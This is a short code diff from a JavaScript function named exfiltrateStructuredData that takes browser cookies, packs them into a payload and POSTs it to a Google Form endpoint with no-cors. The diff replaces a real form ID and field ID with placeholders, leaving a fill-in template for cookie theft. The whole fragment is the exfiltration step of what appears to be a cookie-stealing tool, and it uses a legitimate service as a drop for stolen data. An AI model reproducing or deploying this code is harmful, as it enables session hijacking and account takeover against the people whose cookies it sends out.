@@ -36,9 +36,9 @@ function exfiltrateStructuredData(cookies) {
       };
 
       const formData = new URLSearchParams();
-      formData.append("entry.1508495127", JSON.stringify(payload)); // replace with your actual Google Form field ID
+      formData.append("entry.<XXXXXXXXXX>", JSON.stringify(payload)); // replace with your actual Google Form field ID
 
-      return fetch("https://docs.google.com/forms/d/e/1FAIpQLSfJlrDxR7i_b2DDiIV6OK1ClXJOp-sETcjVx0h8a7cEEZb7DA/formResponse", {
+      return fetch("https://docs.google.com/forms/d/e/<G-Form_ID>/formResponse", {
         method: "POST",
         mode: "no-cors",
         body: formData,
